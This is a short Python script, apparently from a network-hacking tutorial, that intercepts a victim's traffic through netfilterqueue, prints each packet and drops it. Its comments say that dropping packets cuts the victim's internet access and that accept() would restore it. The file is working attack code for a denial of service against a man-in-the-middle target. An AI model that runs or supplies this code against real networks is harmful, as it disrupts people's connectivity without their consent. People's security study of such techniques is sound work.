import netfilterqueue

def process_packet(packet):
    print(packet)
    #packet.accept() This line will forward the captured packet to its destination allowing your victim internet access.
    packet.drop() # We are dropping the packets, basically not forwarding them.

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()